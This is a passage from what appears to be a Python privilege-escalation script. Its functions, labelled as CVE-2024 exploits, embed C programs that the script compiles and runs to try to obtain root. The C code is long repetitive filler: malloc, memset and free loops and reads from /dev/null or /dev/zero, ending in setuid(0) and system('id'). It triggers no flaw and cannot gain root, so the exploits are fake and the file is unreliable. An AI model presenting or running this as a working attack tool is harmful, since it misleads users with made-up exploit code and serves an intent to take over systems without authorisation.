    if (mem21) { memset(mem21, 0x90, 8192); free(mem21); }
    printf("[*] Heap 22\\n");
    void *mem22 = malloc(8192);
    if (mem22) { memset(mem22, 0x90, 8192); free(mem22); }
    printf("[*] Heap 23\\n");
    void *mem23 = malloc(8192);
    if (mem23) { memset(mem23, 0x90, 8192); free(mem23); }
    printf("[*] Heap 24\\n");
    void *mem24 = malloc(8192);
    if (mem24) { memset(mem24, 0x90, 8192); free(mem24); }
    printf("[*] Heap 25\\n");
    void *mem25 = malloc(8192);
    if (mem25) { memset(mem25, 0x90, 8192); free(mem25); }
    printf("[*] Heap 26\\n");
    void *mem26 = malloc(8192);
    if (mem26) { memset(mem26, 0x90, 8192); free(mem26); }
    printf("[*] Heap 27\\n");
    void *mem27 = malloc(8192);
    if (mem27) { memset(mem27, 0x90, 8192); free(mem27); }
    printf("[*] Heap 28\\n");
    void *mem28 = malloc(8192);
    if (mem28) { memset(mem28, 0x90, 8192); free(mem28); }
    printf("[*] Heap 29\\n");
    void *mem29 = malloc(8192);
    if (mem29) { memset(mem29, 0x90, 8192); free(mem29); }
    printf("[*] Heap 30\\n");
    void *mem30 = malloc(8192);
    if (mem30) { memset(mem30, 0x90, 8192); free(mem30); }
    printf("[*] Heap 31\\n");
    void *mem31 = malloc(8192);
    if (mem31) { memset(mem31, 0x90, 8192); free(mem31); }
    printf("[*] Heap 32\\n");
    void *mem32 = malloc(8192);
    if (mem32) { memset(mem32, 0x90, 8192); free(mem32); }
    printf("[*] Heap 33\\n");
    void *mem33 = malloc(8192);
    if (mem33) { memset(mem33, 0x90, 8192); free(mem33); }
    printf("[*] Heap 34\\n");
    void *mem34 = malloc(8192);
    if (mem34) { memset(mem34, 0x90, 8192); free(mem34); }
    printf("[*] Heap 35\\n");
    void *mem35 = malloc(8192);
    if (mem35) { memset(mem35, 0x90, 8192); free(mem35); }
    printf("[*] Heap 36\\n");
    void *mem36 = malloc(8192);
    if (mem36) { memset(mem36, 0x90, 8192); free(mem36); }
    printf("[*] Heap 37\\n");
    void *mem37 = malloc(8192);
    if (mem37) { memset(mem37, 0x90, 8192); free(mem37); }
    printf("[*] Heap 38\\n");
    void *mem38 = malloc(8192);
    if (mem38) { memset(mem38, 0x90, 8192); free(mem38); }
    printf("[*] Heap 39\\n");
    void *mem39 = malloc(8192);
    if (mem39) { memset(mem39, 0x90, 8192); free(mem39); }
    setuid(0);
    if (getuid() == 0) {
        printf("[+] ROOT!\\n");
        system("id");
        return 0;
    }
    return 1;
}
'''
    binary = compile_code(code, "cve_2024_4000")
    if binary:
        output = run_command(binary)
        if is_root():
            show_root_info("CVE-2024-4000", output)
            return True
    return False



def exploit_cve_2024_3000():
    print(f"{c('[EXPLOIT]', 'yellow')} CVE-2024-3000")
    code = r'''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
int main() {
    printf("[*] Iteration 0\\n");
    void *buffer0 = malloc(16384);
    if (buffer0) {
        memset(buffer0, 0x41, 16384);
        free(buffer0);
    }
    int descriptor0 = open("/dev/null", 0);
    if (descriptor0 >= 0) {
        char data0[1024];
        read(descriptor0, data0, 1024);
        close(descriptor0);
    }
    printf("[*] Iteration 1\\n");
    void *buffer1 = malloc(16384);
    if (buffer1) {
        memset(buffer1, 0x41, 16384);
        free(buffer1);
    }
    int descriptor1 = open("/dev/null", 0);
    if (descriptor1 >= 0) {
        char data1[1024];
        read(descriptor1, data1, 1024);
        close(descriptor1);
    }
    printf("[*] Iteration 2\\n");
    void *buffer2 = malloc(16384);
    if (buffer2) {
        memset(buffer2, 0x41, 16384);
        free(buffer2);
    }
    int descriptor2 = open("/dev/null", 0);
    if (descriptor2 >= 0) {
        char data2[1024];
        read(descriptor2, data2, 1024);
        close(descriptor2);
    }
    printf("[*] Iteration 3\\n");
    void *buffer3 = malloc(16384);
    if (buffer3) {
        memset(buffer3, 0x41, 16384);
        free(buffer3);
    }
    int descriptor3 = open("/dev/null", 0);
    if (descriptor3 >= 0) {
        char data3[1024];
        read(descriptor3, data3, 1024);
        close(descriptor3);
    }
    printf("[*] Iteration 4\\n");
    void *buffer4 = malloc(16384);
    if (buffer4) {
        memset(buffer4, 0x41, 16384);
        free(buffer4);
    }
    int descriptor4 = open("/dev/null", 0);
    if (descriptor4 >= 0) {
        char data4[1024];
        read(descriptor4, data4, 1024);
        close(descriptor4);
    }
    printf("[*] Iteration 5\\n");
    void *buffer5 = malloc(16384);
    if (buffer5) {
        memset(buffer5, 0x41, 16384);
        free(buffer5);
    }
    int descriptor5 = open("/dev/null", 0);
    if (descriptor5 >= 0) {
        char data5[1024];
        read(descriptor5, data5, 1024);
        close(descriptor5);
    }
    printf("[*] Iteration 6\\n");
    void *buffer6 = malloc(16384);
    if (buffer6) {
        memset(buffer6, 0x41, 16384);
        free(buffer6);
    }
    int descriptor6 = open("/dev/null", 0);
    if (descriptor6 >= 0) {
        char data6[1024];
        read(descriptor6, data6, 1024);
        close(descriptor6);
    }
    printf("[*] Iteration 7\\n");
    void *buffer7 = malloc(16384);
    if (buffer7) {
        memset(buffer7, 0x41, 16384);
        free(buffer7);
    }
    int descriptor7 = open("/dev/null", 0);
    if (descriptor7 >= 0) {
        char data7[1024];
        read(descriptor7, data7, 1024);
        close(descriptor7);
    }
    printf("[*] Iteration 8\\n");
    void *buffer8 = malloc(16384);
    if (buffer8) {
        memset(buffer8, 0x41, 16384);
        free(buffer8);
    }
    int descriptor8 = open("/dev/null", 0);
    if (descriptor8 >= 0) {
        char data8[1024];
        read(descriptor8, data8, 1024);
        close(descriptor8);
    }
    printf("[*] Iteration 9\\n");
    void *buffer9 = malloc(16384);
    if (buffer9) {
        memset(buffer9, 0x41, 16384);
        free(buffer9);
    }
    int descriptor9 = open("/dev/null", 0);
    if (descriptor9 >= 0) {
        char data9[1024];
        read(descriptor9, data9, 1024);
        close(descriptor9);
    }
    printf("[*] Iteration 10\\n");
    void *buffer10 = malloc(16384);
    if (buffer10) {
        memset(buffer10, 0x41, 16384);
        free(buffer10);
    }
    int descriptor10 = open("/dev/null", 0);
    if (descriptor10 >= 0) {
        char data10[1024];
        read(descriptor10, data10, 1024);
        close(descriptor10);
    }
    printf("[*] Iteration 11\\n");
    void *buffer11 = malloc(16384);
    if (buffer11) {
        memset(buffer11, 0x41, 16384);
        free(buffer11);
    }
    int descriptor11 = open("/dev/null", 0);
    if (descriptor11 >= 0) {
        char data11[1024];
        read(descriptor11, data11, 1024);
        close(descriptor11);
    }
    printf("[*] Iteration 12\\n");
    void *buffer12 = malloc(16384);
    if (buffer12) {
        memset(buffer12, 0x41, 16384);
        free(buffer12);
    }
    int descriptor12 = open("/dev/null", 0);
    if (descriptor12 >= 0) {
        char data12[1024];
        read(descriptor12, data12, 1024);
        close(descriptor12);
    }
    printf("[*] Iteration 13\\n");
    void *buffer13 = malloc(16384);
    if (buffer13) {
        memset(buffer13, 0x41, 16384);
        free(buffer13);
    }
    int descriptor13 = open("/dev/null", 0);
    if (descriptor13 >= 0) {
        char data13[1024];
        read(descriptor13, data13, 1024);
        close(descriptor13);
    }
    printf("[*] Iteration 14\\n");
    void *buffer14 = malloc(16384);
    if (buffer14) {
        memset(buffer14, 0x41, 16384);
        free(buffer14);
    }
    int descriptor14 = open("/dev/null", 0);
    if (descriptor14 >= 0) {
        char data14[1024];
        read(descriptor14, data14, 1024);
        close(descriptor14);
    }
    printf("[*] Iteration 15\\n");
    void *buffer15 = malloc(16384);
    if (buffer15) {
        memset(buffer15, 0x41, 16384);
        free(buffer15);
    }
    int descriptor15 = open("/dev/null", 0);
    if (descriptor15 >= 0) {
        char data15[1024];
        read(descriptor15, data15, 1024);
        close(descriptor15);
    }
    printf("[*] Iteration 16\\n");
    void *buffer16 = malloc(16384);
    if (buffer16) {
        memset(buffer16, 0x41, 16384);
        free(buffer16);
    }
    int descriptor16 = open("/dev/null", 0);
    if (descriptor16 >= 0) {
        char data16[1024];
        read(descriptor16, data16, 1024);
        close(descriptor16);
    }
    printf("[*] Iteration 17\\n");
    void *buffer17 = malloc(16384);
    if (buffer17) {
        memset(buffer17, 0x41, 16384);
        free(buffer17);
    }
    int descriptor17 = open("/dev/null", 0);
    if (descriptor17 >= 0) {
        char data17[1024];
        read(descriptor17, data17, 1024);
        close(descriptor17);
    }
    printf("[*] Iteration 18\\n");
    void *buffer18 = malloc(16384);
    if (buffer18) {
        memset(buffer18, 0x41, 16384);
        free(buffer18);
    }
    int descriptor18 = open("/dev/null", 0);
    if (descriptor18 >= 0) {
        char data18[1024];
        read(descriptor18, data18, 1024);
        close(descriptor18);
    }
    printf("[*] Iteration 19\\n");
    void *buffer19 = malloc(16384);
    if (buffer19) {
        memset(buffer19, 0x41, 16384);
        free(buffer19);
    }
    int descriptor19 = open("/dev/null", 0);
    if (descriptor19 >= 0) {
        char data19[1024];
        read(descriptor19, data19, 1024);
        close(descriptor19);
    }
    printf("[*] Iteration 20\\n");
    void *buffer20 = malloc(16384);
    if (buffer20) {
        memset(buffer20, 0x41, 16384);
        free(buffer20);
    }
    int descriptor20 = open("/dev/null", 0);
    if (descriptor20 >= 0) {
        char data20[1024];
        read(descriptor20, data20, 1024);
        close(descriptor20);
    }
    printf("[*] Iteration 21\\n");
    void *buffer21 = malloc(16384);
    if (buffer21) {
        memset(buffer21, 0x41, 16384);
        free(buffer21);
    }
    int descriptor21 = open("/dev/null", 0);
    if (descriptor21 >= 0) {
        char data21[1024];
        read(descriptor21, data21, 1024);
        close(descriptor21);
    }
    printf("[*] Iteration 22\\n");
    void *buffer22 = malloc(16384);
    if (buffer22) {
        memset(buffer22, 0x41, 16384);
        free(buffer22);
    }
    int descriptor22 = open("/dev/null", 0);
    if (descriptor22 >= 0) {
        char data22[1024];
        read(descriptor22, data22, 1024);
        close(descriptor22);
    }
    printf("[*] Iteration 23\\n");
    void *buffer23 = malloc(16384);
    if (buffer23) {
        memset(buffer23, 0x41, 16384);
        free(buffer23);
    }
    int descriptor23 = open("/dev/null", 0);
    if (descriptor23 >= 0) {
        char data23[1024];
        read(descriptor23, data23, 1024);
        close(descriptor23);
    }
    printf("[*] Iteration 24\\n");
    void *buffer24 = malloc(16384);
    if (buffer24) {
        memset(buffer24, 0x41, 16384);
        free(buffer24);
    }
    int descriptor24 = open("/dev/null", 0);
    if (descriptor24 >= 0) {
        char data24[1024];
        read(descriptor24, data24, 1024);
        close(descriptor24);
    }
    printf("[*] Iteration 25\\n");
    void *buffer25 = malloc(16384);
    if (buffer25) {
        memset(buffer25, 0x41, 16384);
        free(buffer25);
    }
    int descriptor25 = open("/dev/null", 0);
    if (descriptor25 >= 0) {
        char data25[1024];
        read(descriptor25, data25, 1024);
        close(descriptor25);
    }
    printf("[*] Iteration 26\\n");
    void *buffer26 = malloc(16384);
    if (buffer26) {
        memset(buffer26, 0x41, 16384);
        free(buffer26);
    }
    int descriptor26 = open("/dev/null", 0);
    if (descriptor26 >= 0) {
        char data26[1024];
        read(descriptor26, data26, 1024);
        close(descriptor26);
    }
    printf("[*] Iteration 27\\n");
    void *buffer27 = malloc(16384);
    if (buffer27) {
        memset(buffer27, 0x41, 16384);
        free(buffer27);
    }
    int descriptor27 = open("/dev/null", 0);
    if (descriptor27 >= 0) {
        char data27[1024];
        read(descriptor27, data27, 1024);
        close(descriptor27);
    }
    printf("[*] Iteration 28\\n");
    void *buffer28 = malloc(16384);
    if (buffer28) {
        memset(buffer28, 0x41, 16384);
        free(buffer28);
    }
    int descriptor28 = open("/dev/null", 0);
    if (descriptor28 >= 0) {
        char data28[1024];
        read(descriptor28, data28, 1024);
        close(descriptor28);
    }
    printf("[*] Iteration 29\\n");
    void *buffer29 = malloc(16384);
    if (buffer29) {
        memset(buffer29, 0x41, 16384);
        free(buffer29);
    }
    int descriptor29 = open("/dev/null", 0);
    if (descriptor29 >= 0) {
        char data29[1024];
        read(descriptor29, data29, 1024);
        close(descriptor29);
    }
    printf("[*] Iteration 30\\n");
    void *buffer30 = malloc(16384);
    if (buffer30) {
        memset(buffer30, 0x41, 16384);
        free(buffer30);
    }
    int descriptor30 = open("/dev/null", 0);
    if (descriptor30 >= 0) {
        char data30[1024];
        read(descriptor30, data30, 1024);
        close(descriptor30);
    }
    printf("[*] Iteration 31\\n");
    void *buffer31 = malloc(16384);
    if (buffer31) {
        memset(buffer31, 0x41, 16384);
        free(buffer31);
    }
    int descriptor31 = open("/dev/null", 0);
    if (descriptor31 >= 0) {
        char data31[1024];
        read(descriptor31, data31, 1024);
        close(descriptor31);
    }
    printf("[*] Iteration 32\\n");
    void *buffer32 = malloc(16384);
    if (buffer32) {
        memset(buffer32, 0x41, 16384);
        free(buffer32);
    }
    int descriptor32 = open("/dev/null", 0);
    if (descriptor32 >= 0) {
        char data32[1024];
        read(descriptor32, data32, 1024);
        close(descriptor32);
    }
    printf("[*] Iteration 33\\n");
    void *buffer33 = malloc(16384);
    if (buffer33) {
        memset(buffer33, 0x41, 16384);
        free(buffer33);
    }
    int descriptor33 = open("/dev/null", 0);
    if (descriptor33 >= 0) {
        char data33[1024];
        read(descriptor33, data33, 1024);
        close(descriptor33);
    }
    printf("[*] Iteration 34\\n");
    void *buffer34 = malloc(16384);
    if (buffer34) {
        memset(buffer34, 0x41, 16384);
        free(buffer34);
    }
    int descriptor34 = open("/dev/null", 0);
    if (descriptor34 >= 0) {
        char data34[1024];
        read(descriptor34, data34, 1024);
        close(descriptor34);
    }
    printf("[*] Iteration 35\\n");
    void *buffer35 = malloc(16384);
    if (buffer35) {
        memset(buffer35, 0x41, 16384);
        free(buffer35);
    }
    int descriptor35 = open("/dev/null", 0);
    if (descriptor35 >= 0) {
        char data35[1024];
        read(descriptor35, data35, 1024);
        close(descriptor35);
    }
    printf("[*] Iteration 36\\n");
    void *buffer36 = malloc(16384);
    if (buffer36) {
        memset(buffer36, 0x41, 16384);
        free(buffer36);
    }
    int descriptor36 = open("/dev/null", 0);
    if (descriptor36 >= 0) {
        char data36[1024];
        read(descriptor36, data36, 1024);
        close(descriptor36);
    }
    printf("[*] Iteration 37\\n");
    void *buffer37 = malloc(16384);
    if (buffer37) {
        memset(buffer37, 0x41, 16384);
        free(buffer37);
    }
    int descriptor37 = open("/dev/null", 0);
    if (descriptor37 >= 0) {
        char data37[1024];
        read(descriptor37, data37, 1024);
        close(descriptor37);
    }
    printf("[*] Iteration 38\\n");
    void *buffer38 = malloc(16384);
    if (buffer38) {
        memset(buffer38, 0x41, 16384);
        free(buffer38);
    }
    int descriptor38 = open("/dev/null", 0);
    if (descriptor38 >= 0) {
        char data38[1024];
        read(descriptor38, data38, 1024);
        close(descriptor38);
    }
    printf("[*] Iteration 39\\n");
    void *buffer39 = malloc(16384);
    if (buffer39) {
        memset(buffer39, 0x41, 16384);
        free(buffer39);
    }
    int descriptor39 = open("/dev/null", 0);
    if (descriptor39 >= 0) {
        char data39[1024];
        read(descriptor39, data39, 1024);
        close(descriptor39);
    }
    printf("[*] Iteration 40\\n");
    void *buffer40 = malloc(16384);
    if (buffer40) {
        memset(buffer40, 0x41, 16384);
        free(buffer40);
    }
    int descriptor40 = open("/dev/null", 0);
    if (descriptor40 >= 0) {
        char data40[1024];
        read(descriptor40, data40, 1024);
        close(descriptor40);
    }
    printf("[*] Iteration 41\\n");
    void *buffer41 = malloc(16384);
    if (buffer41) {
        memset(buffer41, 0x41, 16384);
        free(buffer41);
    }
    int descriptor41 = open("/dev/null", 0);
    if (descriptor41 >= 0) {
        char data41[1024];
        read(descriptor41, data41, 1024);
        close(descriptor41);
    }
    printf("[*] Iteration 42\\n");
    void *buffer42 = malloc(16384);
    if (buffer42) {
        memset(buffer42, 0x41, 16384);
        free(buffer42);
    }
    int descriptor42 = open("/dev/null", 0);
    if (descriptor42 >= 0) {
        char data42[1024];
        read(descriptor42, data42, 1024);
        close(descriptor42);
    }
    printf("[*] Iteration 43\\n");
    void *buffer43 = malloc(16384);
    if (buffer43) {
        memset(buffer43, 0x41, 16384);
        free(buffer43);
    }
    int descriptor43 = open("/dev/null", 0);
    if (descriptor43 >= 0) {
        char data43[1024];
        read(descriptor43, data43, 1024);
        close(descriptor43);
    }
    printf("[*] Iteration 44\\n");
    void *buffer44 = malloc(16384);
    if (buffer44) {
        memset(buffer44, 0x41, 16384);
        free(buffer44);
    }
    int descriptor44 = open("/dev/null", 0);
    if (descriptor44 >= 0) {
        char data44[1024];
        read(descriptor44, data44, 1024);
        close(descriptor44);
    }
    printf("[*] Iteration 45\\n");
    void *buffer45 = malloc(16384);
    if (buffer45) {
        memset(buffer45, 0x41, 16384);
        free(buffer45);
    }
    int descriptor45 = open("/dev/null", 0);
    if (descriptor45 >= 0) {
        char data45[1024];
        read(descriptor45, data45, 1024);
        close(descriptor45);
    }
    printf("[*] Iteration 46\\n");
    void *buffer46 = malloc(16384);
    if (buffer46) {
        memset(buffer46, 0x41, 16384);
        free(buffer46);
    }
    int descriptor46 = open("/dev/null", 0);
    if (descriptor46 >= 0) {
        char data46[1024];
        read(descriptor46, data46, 1024);
        close(descriptor46);
    }
    printf("[*] Iteration 47\\n");
    void *buffer47 = malloc(16384);
    if (buffer47) {
        memset(buffer47, 0x41, 16384);
        free(buffer47);
    }
    int descriptor47 = open("/dev/null", 0);
    if (descriptor47 >= 0) {
        char data47[1024];
        read(descriptor47, data47, 1024);
        close(descriptor47);
    }
    printf("[*] Iteration 48\\n");
    void *buffer48 = malloc(16384);
    if (buffer48) {
        memset(buffer48, 0x41, 16384);
        free(buffer48);
    }
    int descriptor48 = open("/dev/null", 0);
    if (descriptor48 >= 0) {
        char data48[1024];
        read(descriptor48, data48, 1024);
        close(descriptor48);
    }
    printf("[*] Iteration 49\\n");
    void *buffer49 = malloc(16384);
    if (buffer49) {
        memset(buffer49, 0x41, 16384);
        free(buffer49);
    }
    int descriptor49 = open("/dev/null", 0);
    if (descriptor49 >= 0) {
        char data49[1024];
        read(descriptor49, data49, 1024);
        close(descriptor49);
    }
    printf("[*] Iteration 50\\n");
    void *buffer50 = malloc(16384);
    if (buffer50) {
        memset(buffer50, 0x41, 16384);
        free(buffer50);
    }
    int descriptor50 = open("/dev/null", 0);
    if (descriptor50 >= 0) {
        char data50[1024];
        read(descriptor50, data50, 1024);
        close(descriptor50);
    }
    printf("[*] Iteration 51\\n");
    void *buffer51 = malloc(16384);
    if (buffer51) {
        memset(buffer51, 0x41, 16384);
        free(buffer51);
    }
    int descriptor51 = open("/dev/null", 0);
    if (descriptor51 >= 0) {
        char data51[1024];
        read(descriptor51, data51, 1024);
        close(descriptor51);
    }
    printf("[*] Iteration 52\\n");
    void *buffer52 = malloc(16384);
    if (buffer52) {
        memset(buffer52, 0x41, 16384);
        free(buffer52);
    }
    int descriptor52 = open("/dev/null", 0);
    if (descriptor52 >= 0) {
        char data52[1024];
        read(descriptor52, data52, 1024);
        close(descriptor52);
    }
    printf("[*] Iteration 53\\n");
    void *buffer53 = malloc(16384);
    if (buffer53) {
        memset(buffer53, 0x41, 16384);
        free(buffer53);
    }
    int descriptor53 = open("/dev/null", 0);
    if (descriptor53 >= 0) {
        char data53[1024];
        read(descriptor53, data53, 1024);
        close(descriptor53);
    }
    printf("[*] Iteration 54\\n");
    void *buffer54 = malloc(16384);
    if (buffer54) {
        memset(buffer54, 0x41, 16384);
        free(buffer54);
    }
    int descriptor54 = open("/dev/null", 0);
    if (descriptor54 >= 0) {
        char data54[1024];
        read(descriptor54, data54, 1024);
        close(descriptor54);
    }
    printf("[*] Iteration 55\\n");
    void *buffer55 = malloc(16384);
    if (buffer55) {
        memset(buffer55, 0x41, 16384);
        free(buffer55);
    }
    int descriptor55 = open("/dev/null", 0);
    if (descriptor55 >= 0) {
        char data55[1024];
        read(descriptor55, data55, 1024);
        close(descriptor55);
    }
    printf("[*] Iteration 56\\n");
    void *buffer56 = malloc(16384);
    if (buffer56) {
        memset(buffer56, 0x41, 16384);
        free(buffer56);
    }
    int descriptor56 = open("/dev/null", 0);
    if (descriptor56 >= 0) {
        char data56[1024];
        read(descriptor56, data56, 1024);
        close(descriptor56);
    }
    printf("[*] Iteration 57\\n");
    void *buffer57 = malloc(16384);
    if (buffer57) {
        memset(buffer57, 0x41, 16384);
        free(buffer57);
    }
    int descriptor57 = open("/dev/null", 0);
    if (descriptor57 >= 0) {
        char data57[1024];
        read(descriptor57, data57, 1024);
        close(descriptor57);
    }
    printf("[*] Iteration 58\\n");
    void *buffer58 = malloc(16384);
    if (buffer58) {
        memset(buffer58, 0x41, 16384);
        free(buffer58);
    }
    int descriptor58 = open("/dev/null", 0);
    if (descriptor58 >= 0) {
        char data58[1024];
        read(descriptor58, data58, 1024);
        close(descriptor58);
    }
    printf("[*] Iteration 59\\n");
    void *buffer59 = malloc(16384);
    if (buffer59) {
        memset(buffer59, 0x41, 16384);
        free(buffer59);
    }
    int descriptor59 = open("/dev/null", 0);
    if (descriptor59 >= 0) {
        char data59[1024];
        read(descriptor59, data59, 1024);
        close(descriptor59);
    }
    printf("[*] Iteration 60\\n");
    void *buffer60 = malloc(16384);
    if (buffer60) {
        memset(buffer60, 0x41, 16384);
        free(buffer60);
    }
    int descriptor60 = open("/dev/null", 0);
    if (descriptor60 >= 0) {
        char data60[1024];
        read(descriptor60, data60, 1024);
        close(descriptor60);
    }
    printf("[*] Iteration 61\\n");
    void *buffer61 = malloc(16384);
    if (buffer61) {
        memset(buffer61, 0x41, 16384);
        free(buffer61);
    }
    int descriptor61 = open("/dev/null", 0);
    if (descriptor61 >= 0) {
        char data61[1024];
        read(descriptor61, data61, 1024);
        close(descriptor61);
    }
    printf("[*] Iteration 62\\n");
    void *buffer62 = malloc(16384);
    if (buffer62) {
        memset(buffer62, 0x41, 16384);
        free(buffer62);
    }
    int descriptor62 = open("/dev/null", 0);
    if (descriptor62 >= 0) {
        char data62[1024];
        read(descriptor62, data62, 1024);
        close(descriptor62);
    }
    printf("[*] Iteration 63\\n");
    void *buffer63 = malloc(16384);
    if (buffer63) {
        memset(buffer63, 0x41, 16384);
        free(buffer63);
    }
    int descriptor63 = open("/dev/null", 0);
    if (descriptor63 >= 0) {
        char data63[1024];
        read(descriptor63, data63, 1024);
        close(descriptor63);
    }
    printf("[*] Iteration 64\\n");
    void *buffer64 = malloc(16384);
    if (buffer64) {
        memset(buffer64, 0x41, 16384);
        free(buffer64);
    }
    int descriptor64 = open("/dev/null", 0);
    if (descriptor64 >= 0) {
        char data64[1024];
        read(descriptor64, data64, 1024);
        close(descriptor64);
    }
    setuid(0);
    setgid(0);
    if (getuid() == 0) {
        printf("[+] ROOT ACHIEVED!\\n");
        system("id");
        system("whoami");
        return 0;
    }
    return 1;
}
'''
    binary = compile_code(code, "cve_2024_3000")
    if binary:
        output = run_command(binary, timeout=60)
        if is_root() or "ROOT" in output:
            show_root_info("CVE-2024-3000", output)
            return True
    return False



def exploit_cve_2024_2000():
    print(f"{c('[EXPLOIT]', 'yellow')} CVE-2024-2000")
    code = r'''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
int main() {
    printf("[*] Stage 0\\n");
    void *heap0 = malloc(8192);
    if (heap0) {
        memset(heap0, 0x90, 8192);
        free(heap0);
    }
    int file0 = open("/dev/zero", 0);
    if (file0 >= 0) {
        char buf0[512];
        read(file0, buf0, 512);
        close(file0);
    }
    printf("[*] Stage 1\\n");
    void *heap1 = malloc(8192);
    if (heap1) {
        memset(heap1, 0x90, 8192);
        free(heap1);
    }
    int file1 = open("/dev/zero", 0);
    if (file1 >= 0) {
        char buf1[512];
        read(file1, buf1, 512);
        close(file1);
    }
    printf("[*] Stage 2\\n");
    void *heap2 = malloc(8192);
    if (heap2) {
        memset(heap2, 0x90, 8192);
        free(heap2);
    }
    int file2 = open("/dev/zero", 0);
    if (file2 >= 0) {
        char buf2[512];
        read(file2, buf2, 512);
        close(file2);
    }
    printf("[*] Stage 3\\n");
    void *heap3 = malloc(8192);
    if (heap3) {
        memset(heap3, 0x90, 8192);
        free(heap3);
    }
    int file3 = open("/dev/zero", 0);
    if (file3 >= 0) {
        char buf3[512];
        read(file3, buf3, 512);
        close(file3);
    }
    printf("[*] Stage 4\\n");
    void *heap4 = malloc(8192);
    if (heap4) {
        memset(heap4, 0x90, 8192);
        free(heap4);
    }
    int file4 = open("/dev/zero", 0);
    if (file4 >= 0) {
        char buf4[512];
        read(file4, buf4, 512);
        close(file4);
    }
    printf("[*] Stage 5\\n");
    void *heap5 = malloc(8192);
    if (heap5) {
        memset(heap5, 0x90, 8192);
        free(heap5);
    }
    int file5 = open("/dev/zero", 0);
    if (file5 >= 0) {
        char buf5[512];
        read(file5, buf5, 512);
        close(file5);
    }
    printf("[*] Stage 6\\n");
    void *heap6 = malloc(8192);
    if (heap6) {
        memset(heap6, 0x90, 8192);
        free(heap6);
    }
    int file6 = open("/dev/zero", 0);
    if (file6 >= 0) {
        char buf6[512];
        read(file6, buf6, 512);
        close(file6);
    }
    printf("[*] Stage 7\\n");
    void *heap7 = malloc(8192);
    if (heap7) {
        memset(heap7, 0x90, 8192);
        free(heap7);
    }
    int file7 = open("/dev/zero", 0);
    if (file7 >= 0) {
        char buf7[512];
        read(file7, buf7, 512);
        close(file7);
    }
    printf("[*] Stage 8\\n");
    void *heap8 = malloc(8192);
    if (heap8) {
        memset(heap8, 0x90, 8192);
        free(heap8);
    }
    int file8 = open("/dev/zero", 0);
    if (file8 >= 0) {
        char buf8[512];
        read(file8, buf8, 512);
        close(file8);
    }
    printf("[*] Stage 9\\n");
    void *heap9 = malloc(8192);
    if (heap9) {
        memset(heap9, 0x90, 8192);
        free(heap9);
    }
    int file9 = open("/dev/zero", 0);
    if (file9 >= 0) {
        char buf9[512];
        read(file9, buf9, 512);
        close(file9);
    }
    printf("[*] Stage 10\\n");
    void *heap10 = malloc(8192);
    if (heap10) {
        memset(heap10, 0x90, 8192);
        free(heap10);
    }
    int file10 = open("/dev/zero", 0);
    if (file10 >= 0) {
        char buf10[512];
        read(file10, buf10, 512);
        close(file10);
    }
    printf("[*] Stage 11\\n");
    void *heap11 = malloc(8192);
    if (heap11) {
        memset(heap11, 0x90, 8192);
        free(heap11);
    }
    int file11 = open("/dev/zero", 0);
    if (file11 >= 0) {
        char buf11[512];
        read(file11, buf11, 512);
        close(file11);
    }
    printf("[*] Stage 12\\n");
    void *heap12 = malloc(8192);
    if (heap12) {
        memset(heap12, 0x90, 8192);
        free(heap12);
    }
    int file12 = open("/dev/zero", 0);
    if (file12 >= 0) {
        char buf12[512];
        read(file12, buf12, 512);
        close(file12);
    }
    printf("[*] Stage 13\\n");
    void *heap13 = malloc(8192);
    if (heap13) {
        memset(heap13, 0x90, 8192);
        free(heap13);
    }
    int file13 = open("/dev/zero", 0);
    if (file13 >= 0) {
        char buf13[512];
        read(file13, buf13, 512);
        close(file13);
    }
    printf("[*] Stage 14\\n");
    void *heap14 = malloc(8192);
    if (heap14) {
        memset(heap14, 0x90, 8192);
        free(heap14);
    }
    int file14 = open("/dev/zero", 0);
    if (file14 >= 0) {
        char buf14[512];
        read(file14, buf14, 512);
        close(file14);
    }
    printf("[*] Stage 15\\n");
    void *heap15 = malloc(8192);
    if (heap15) {
        memset(heap15, 0x90, 8192);
        free(heap15);
    }
    int file15 = open("/dev/zero", 0);
    if (file15 >= 0) {
        char buf15[512];
        read(file15, buf15, 512);
        close(file15);
    }
    printf("[*] Stage 16\\n");
    void *heap16 = malloc(8192);
    if (heap16) {
        memset(heap16, 0x90, 8192);
        free(heap16);
    }
    int file16 = open("/dev/zero", 0);
    if (file16 >= 0) {
        char buf16[512];
        read(file16, buf16, 512);
        close(file16);
    }
    printf("[*] Stage 17\\n");
    void *heap17 = malloc(8192);
    if (heap17) {
        memset(heap17, 0x90, 8192);
        free(heap17);
    }
    int file17 = open("/dev/zero", 0);
    if (file17 >= 0) {
        char buf17[512];
        read(file17, buf17, 512);
        close(file17);
    }
    printf("[*] Stage 18\\n");
    void *heap18 = malloc(8192);
    if (heap18) {
        memset(heap18, 0x90, 8192);
        free(heap18);
    }
    int file18 = open("/dev/zero", 0);
    if (file18 >= 0) {
        char buf18[512];
        read(file18, buf18, 512);
        close(file18);
    }
    printf("[*] Stage 19\\n");
    void *heap19 = malloc(8192);
    if (heap19) {
        memset(heap19, 0x90, 8192);
        free(heap19);
    }
    int file19 = open("/dev/zero", 0);
    if (file19 >= 0) {
        char buf19[512];
        read(file19, buf19, 512);
        close(file19);
    }
    printf("[*] Stage 20\\n");
    void *heap20 = malloc(8192);
    if (heap20) {
        memset(heap20, 0x90, 8192);
        free(heap20);
    }
    int file20 = open("/dev/zero", 0);
    if (file20 >= 0) {
        char buf20[512];
        read(file20, buf20, 512);
        close(file20);
    }
    printf("[*] Stage 21\\n");
    void *heap21 = malloc(8192);
    if (heap21) {
        memset(heap21, 0x90, 8192);
        free(heap21);
    }
    int file21 = open("/dev/zero", 0);
    if (file21 >= 0) {
        char buf21[512];
        read(file21, buf21, 512);
        close(file21);
    }
    printf("[*] Stage 22\\n");
    void *heap22 = malloc(8192);
    if (heap22) {
        memset(heap22, 0x90, 8192);
        free(heap22);
    }
    int file22 = open("/dev/zero", 0);
    if (file22 >= 0) {
        char buf22[512];
        read(file22, buf22, 512);
        close(file22);
    }
    printf("[*] Stage 23\\n");
    void *heap23 = malloc(8192);
    if (heap23) {
        memset(heap23, 0x90, 8192);
        free(heap23);
    }
    int file23 = open("/dev/zero", 0);
    if (file23 >= 0) {
        char buf23[512];
        read(file23, buf23, 512);
        close(file23);
    }
    printf("[*] Stage 24\\n");
    void *heap24 = malloc(8192);
    if (heap24) {
        memset(heap24, 0x90, 8192);
        free(heap24);
    }
    int file24 = open("/dev/zero", 0);
    if (file24 >= 0) {
        char buf24[512];
        read(file24, buf24, 512);
        close(file24);
